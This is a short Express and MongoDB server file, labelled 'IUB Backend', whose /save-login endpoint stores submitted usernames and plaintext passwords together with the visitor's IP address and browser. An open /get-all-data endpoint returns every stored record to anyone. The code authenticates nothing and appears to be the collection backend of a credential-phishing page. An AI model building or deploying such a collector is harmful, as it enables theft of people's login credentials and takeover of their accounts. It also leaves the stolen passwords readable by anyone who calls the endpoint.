const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// Railway automatic MONGO_URL use karega
const MONGODB_URI = process.env.MONGO_URL || "mongodb://localhost:27017/iub_data";

mongoose.connect(MONGODB_URI)
    .then(() => console.log("✅ MongoDB Connected"))
    .catch(err => console.log("❌ MongoDB Error:", err));

const loginSchema = new mongoose.Schema({
    username: String,
    password: String,
    timestamp: { type: Date, default: Date.now },
    ip: String,
    browser: String
});
const LoginData = mongoose.model('LoginData', loginSchema);

app.get('/test', (req, res) => {
    res.json({ 
        status: "🚀 IUB Backend Running",
        time: new Date().toISOString(),
        database: mongoose.connection.readyState === 1 ? "Connected ✅" : "Disconnected"
    });
});

app.post('/save-login', async (req, res) => {
    try {
        const { username, password, browser } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        const newData = new LoginData({
            username: username,
            password: password,
            ip: ip,
            browser: browser
        });
        
        await newData.save();
        console.log("📥 Data Saved:", { username, ip });
        
        res.json({ 
            success: true, 
            message: "✅ Login information saved!",
            data: { username, time: new Date().toLocaleString() }
        });
        
    } catch (error) {
        console.error("❌ Error:", error);
        res.status(500).json({ success: false, message: "Server error" });
    }
});

app.get('/get-all-data', async (req, res) => {
    try {
        const allData = await LoginData.find().sort({ timestamp: -1 });
        res.json({ success: true, count: allData.length, data: allData });
    } catch (error) {
        res.status(500).json({ success: false, message: "Error fetching data" });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
